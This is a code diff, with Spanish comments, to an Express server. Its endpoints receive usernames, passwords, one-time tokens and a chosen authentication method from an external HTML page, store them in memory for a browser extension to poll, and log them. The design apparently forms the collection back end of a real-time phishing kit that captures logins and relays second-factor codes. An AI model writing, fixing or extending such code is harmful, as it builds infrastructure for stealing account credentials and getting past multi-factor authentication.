@@ -1,8 +1,8 @@
 const express = require('express');
-const cors = require('cors'); // Asegúrate de tenerlo instalado: npm install cors
+const cors = require('cors'); 
 const app = express();
 
-app.use(cors()); // Permite conexiones desde tu página HTML externa
+app.use(cors()); 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
@@ -12,43 +12,42 @@ let baseDeDatosTemporal = {
     token: null,
     origen: null,
     actualizado: false,
-    metodo: null // <--- Nueva propiedad para el método de auth
+    metodo: null 
 };
 
-// --- NUEVA RUTA: RECIBIR MÉTODO DESDE EL HTML ---
+// --- RUTA: RECIBIR MÉTODO ---
 app.post('/metodo', (req, res) => {
     const { metodo } = req.body;
     baseDeDatosTemporal.metodo = metodo;
+    baseDeDatosTemporal.actualizado = true; // Importante para que la extensión lo vea
     console.log("===============================");
-    console.log(`🎯 Método Seleccionado: ${metodo.toUpperCase()}`);
+    console.log(`🎯 Método Seleccionado: ${metodo ? metodo.toUpperCase() : 'NULL'}`);
     console.log("===============================");
     res.status(200).send("OK");
 });
 
 app.post('/recibir', (req, res) => {
-    const { user, pass, token, origen } = req.body;
+    // CAMBIO AQUÍ: Ahora extraemos también 'metodo' del cuerpo de la petición
+    const { user, pass, token, origen, metodo } = req.body;
 
-    // --- LÓGICA CORREGIDA ---
     let tokenFinal;
 
     if (origen === "LOGIN_INICIAL") {
-        // Obligamos a que el token sea null al empezar
         tokenFinal = null;
     } else if (token !== undefined && token !== "") {
-        // Solo si envías un token real, lo guardamos
         tokenFinal = token;
     } else {
-        // Si no es login inicial y no envías token, 
-        // mantenemos el que está solo si es el MISMO usuario
         tokenFinal = (user === baseDeDatosTemporal.user) ? baseDeDatosTemporal.token : null;
     }
 
+    // RECONSTRUCCIÓN DEL OBJETO CORREGIDA
     baseDeDatosTemporal = {
         user: user || baseDeDatosTemporal.user,
         pass: pass || baseDeDatosTemporal.pass,
         token: tokenFinal,
         origen: origen,
-        metodo: baseDeDatosTemporal.metodo, // Mantenemos el método guardado
+        // CAMBIO AQUÍ: Si viene un método en la petición, úsalo; si no, mantén el que ya tenemos
+        metodo: metodo || baseDeDatosTemporal.metodo, 
         actualizado: true
     };
 
@@ -61,7 +60,6 @@ app.post('/recibir', (req, res) => {
     res.status(200).send("OK");
 });
 
-// --- RUTA: LIMPIAR DATOS ---
 app.post('/limpiar', (req, res) => {
     baseDeDatosTemporal = {
         user: null,
@@ -69,9 +67,9 @@ app.post('/limpiar', (req, res) => {
         token: null,
         origen: null,
         actualizado: false,
-        metodo: null // También limpiamos el método
+        metodo: null 
     };
-    console.log("🧹 Base de datos reseteada por la extensión.");
+    console.log("🧹 Base de datos reseteada.");
     res.status(200).send("Limpiado");
 });
 
